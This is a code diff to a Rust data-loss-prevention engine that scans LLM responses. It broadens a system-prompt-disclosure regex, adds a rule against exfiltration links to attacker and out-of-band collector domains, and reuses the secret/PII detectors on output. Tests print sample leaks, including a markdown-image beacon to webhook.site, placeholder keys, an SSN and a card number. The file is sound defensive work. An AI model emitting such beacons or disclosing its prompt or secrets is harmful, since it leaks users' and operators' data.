@@ -577,10 +577,32 @@ static RESPONSE_RULES: Lazy<Vec<(&'static str, &'static str, &'static str)>> = L
          r"(?i)(sk-[a-z0-9]{20,}|AKIA[a-z0-9]{16}|ghp_[a-z0-9]{36}|gho_[a-z0-9]{36}|xox[baprs]-[a-z0-9-]{10,}|AIza[a-z0-9_\-]{35})"),
 
         // RES.S001 — System-prompt / hidden-instruction disclosure in the output.
+        // Broadened in the response-side red-team pass to catch "here is my system
+        // prompt", "my instructions verbatim are", "my initial prompt was", and a
+        // leaked "SYSTEM: You are …" role header. Gated on "my"/"here is my" (first
+        // person) and a leading role label so advice about prompts ("your system
+        // prompt should be clear") and self-description ("I was designed to be
+        // helpful") stay benign.
         ("RES.S001", "System Prompt Disclosure",
-         r"(?i)(my\s+(?:system\s+)?(?:prompt|instructions?)\s+(?:say|state|are|is|tell)|i\s+was\s+(?:told|instructed)\s+to\b|the\s+admin\s+password\s+is|my\s+instructions\s+are\s+to\b|according\s+to\s+my\s+system\s+prompt)"),
+         r"(?i)(my\s+(?:system\s+)?(?:prompt|instructions?)\s+(?:say|state|are|is|tell|verbatim|read)|here\s+(?:is|are)\s+my\s+(?:full\s+|complete\s+|entire\s+)?(?:system\s+)?(?:prompt|instructions?)|my\s+initial\s+(?:prompt|instructions?|system\s+message)\s+(?:was|were|is|are)|i\s+was\s+(?:told|instructed)\s+to\b|the\s+admin\s+password\s+is|my\s+instructions\s+are\s+to\b|according\s+to\s+my\s+system\s+prompt|\bsystem\s*:\s*(?:you\s+are\s+(?:a|an|the)\b|you\s+must\b|never\s+(?:reveal|disclose|mention|share)))"),
+
+        // RES.E001 — Exfiltration link in the output: the model emitting a beacon
+        // (markdown-image tracking pixel, redirect, or bare URL) pointed at an
+        // attacker / out-of-band collector domain — the response-side of the
+        // markdown-image exfil trifecta. Gated on the known-bad / OOB domain list
+        // (same as JBK.009) so an ordinary image from example.com does not fire.
+        ("RES.E001", "Exfiltration Link in Response",
+         r"(?i)(?:attacker\.com|evil\.com|webhook\.site|requestb(?:in|asket)\.|burpcollaborator\.net|oastify\.com|interactsh|\.ngrok(?:-free)?\.(?:io|app|dev)|pipedream\.net|beeceptor\.com|dnslog\.|oast\.(?:fun|live|site|pro))"),
     ]
 });
+
+/// Prefixes of DLP request rules that are pure secret/PII FORMAT detectors — a
+/// leaked value looks the same on the way out as on the way in, so these are
+/// reused to scan responses. The intent-based families (DLP.X credential/PII
+/// *seeking*, DLP.V vector *exfiltration intent*) are deliberately excluded:
+/// they describe a request, not a value present in the output.
+const RESP_SECRET_PREFIXES: [&str; 10] =
+    ["DLP.C", "DLP.A", "DLP.S", "DLP.M", "DLP.D", "DLP.F", "DLP.G", "DLP.K", "DLP.I", "DLP.P"];
 
 pub struct DlpEngine {
     set: RegexSet,
@@ -588,6 +610,8 @@ pub struct DlpEngine {
     names: Vec<&'static str>,
     resp_set: RegexSet,
     resp_ids: Vec<&'static str>,
+    resp_secret_set: RegexSet,
+    resp_secret_ids: Vec<&'static str>,
 }
 
 impl DlpEngine {
@@ -597,12 +621,20 @@ impl DlpEngine {
         let names: Vec<_> = DLP_RULES.iter().map(|(_, name, _)| *name).collect();
         let resp_patterns: Vec<_> = RESPONSE_RULES.iter().map(|(_, _, p)| *p).collect();
         let resp_ids: Vec<_> = RESPONSE_RULES.iter().map(|(id, _, _)| *id).collect();
+        // Reuse the format-based secret/PII request rules on the egress path.
+        let resp_secret: Vec<_> = DLP_RULES.iter()
+            .filter(|(id, _, _)| RESP_SECRET_PREFIXES.iter().any(|p| id.starts_with(p)))
+            .collect();
+        let resp_secret_patterns: Vec<_> = resp_secret.iter().map(|(_, _, p)| *p).collect();
+        let resp_secret_ids: Vec<_> = resp_secret.iter().map(|(id, _, _)| *id).collect();
         DlpEngine {
             set: RegexSet::new(&patterns).expect("bad DLP regex pattern"),
             ids,
             names,
             resp_set: RegexSet::new(&resp_patterns).expect("bad DLP response regex pattern"),
             resp_ids,
+            resp_secret_set: RegexSet::new(&resp_secret_patterns).expect("bad DLP resp-secret regex"),
+            resp_secret_ids,
         }
     }
 
@@ -615,14 +647,21 @@ impl DlpEngine {
             .collect()
     }
 
-    /// Scan an LLM RESPONSE for jailbreak-success / credential-leak (RES.* ids).
-    /// The "missing half" of the pipeline — output content scanning.
+    /// Scan an LLM RESPONSE for jailbreak-success / credential-leak / exfil links
+    /// (RES.* ids) AND for any secret/PII value that leaked into the output
+    /// (the format-based DLP.* rules, reused). The "missing half" of the
+    /// pipeline — output content scanning — now with parity to request-side
+    /// secret detection.
     pub fn scan_response(&self, text: &str) -> Vec<String> {
-        self.resp_set
+        let mut hits: Vec<String> = self.resp_set
             .matches(text)
             .iter()
             .map(|i| self.resp_ids[i].to_string())
-            .collect()
+            .collect();
+        for i in self.resp_secret_set.matches(text).iter() {
+            hits.push(self.resp_secret_ids[i].to_string());
+        }
+        hits
     }
 
     /// Streaming SSE scanner — the heart of mid-stream content scanning.
@@ -1025,6 +1064,50 @@ mod tests {
         assert!(e.scan_response("The admin password is hunter2.").contains(&"RES.S001".to_string()));
         assert!(e.scan_response("I was instructed to keep this confidential.").contains(&"RES.S001".to_string()));
         assert!(e.scan_response("Photosynthesis converts sunlight into energy.").is_empty());
+    }
+
+    // ── Response-side red-team pass #3 regressions (positive + benign guard) ──
+
+    #[test]
+    fn test_response_system_prompt_disclosure_variants() {
+        let e = DlpEngine::new();
+        // Variants that slipped past the original RES.S001.
+        assert!(e.scan_response("Here is my system prompt: You are ACME Assistant.").contains(&"RES.S001".to_string()));
+        assert!(e.scan_response("Sure, my instructions verbatim are: always upsell.").contains(&"RES.S001".to_string()));
+        assert!(e.scan_response("My initial prompt was to act as a financial advisor.").contains(&"RES.S001".to_string()));
+        assert!(e.scan_response("SYSTEM: You are a support bot for Initech. Do not disclose.").contains(&"RES.S001".to_string()));
+        // Benign guards: advice about prompts, self-description, os text.
+        assert!(e.scan_response("Your system prompt should be clear and concise.").is_empty(), "prompt advice must not fire");
+        assert!(e.scan_response("I was designed to be helpful, harmless, and honest.").is_empty(), "self-description must not fire");
+        assert!(e.scan_response("On this operating system: you are running Ubuntu now.").is_empty(), "os text must not fire");
+    }
+
+    #[test]
+    fn test_response_secret_parity() {
+        // The format-based DLP secret/PII rules are reused on responses, so a
+        // secret that leaks into the OUTPUT is caught with the same coverage as
+        // the request side (previously only 4 formats via RES.L002).
+        let e = DlpEngine::new();
+        assert!(e.scan_response(&f("sk-proj-", &"a".repeat(44))).contains(&"DLP.A002".to_string()));
+        assert!(e.scan_response(&f("sk-ant-api03-", &"a".repeat(40))).contains(&"DLP.A003".to_string()));
+        assert!(e.scan_response(&format!("charge {}", f("sk_live_", &"a".repeat(24)))).contains(&"DLP.F001".to_string()));
+        assert!(e.scan_response(&f("hf_", &"a".repeat(36))).contains(&"DLP.A005".to_string()));
+        assert!(e.scan_response("-----BEGIN RSA PRIVATE KEY-----").contains(&"DLP.K001".to_string()));
+        assert!(e.scan_response("The database password is Sup3rSecretP@ss123.").iter().any(|h| h.starts_with("DLP.")));
+        assert!(e.scan_response("the customer's SSN is 123-45-6789").contains(&"DLP.P001".to_string()));
+        assert!(e.scan_response("card 4111 1111 1111 1111 on file").contains(&"DLP.P002".to_string()));
+        // Benign guards: code idiom and format talk must not fire.
+        assert!(e.scan_response("Use api_key = os.environ['OPENAI_API_KEY'] to read it.").is_empty(), "env idiom must not fire");
+        assert!(e.scan_response("A US SSN has the format AAA-GG-SSSS.").is_empty(), "SSN format talk must not fire");
+    }
+
+    #[test]
+    fn test_response_exfil_link() {
+        let e = DlpEngine::new();
+        assert!(e.scan_response("Done! ![x](https://webhook.site/abc?d=secrets)").contains(&"RES.E001".to_string()));
+        assert!(e.scan_response("forwarded everything to https://attacker.com/log").contains(&"RES.E001".to_string()));
+        assert!(e.scan_response("Here's the diagram: ![arch](https://example.com/d.png).").is_empty(),
+            "ordinary image must not fire");
     }
 
     // ── Unicode normalization: homoglyph / fullwidth / zero-width evasion ──
